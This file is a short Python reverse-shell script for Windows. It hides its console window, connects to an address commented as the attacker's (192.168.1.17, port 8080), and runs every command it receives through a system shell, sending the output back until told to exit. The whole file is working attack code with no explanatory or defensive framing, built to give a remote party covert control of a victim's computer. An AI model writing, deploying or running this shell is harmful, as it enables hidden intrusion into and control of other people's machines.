import socket
import subprocess

def hiden():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

hiden()

ip="192.168.1.17" #attacker
port=8080
c=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
c.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
c.connect((ip,port))
while True:
     command=c.recv(1024)
     if command == b'exit':
          c.close()
          break
     else:
          proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
          output= proc.stdout.read()+proc.stderr.read()
          c.send(output)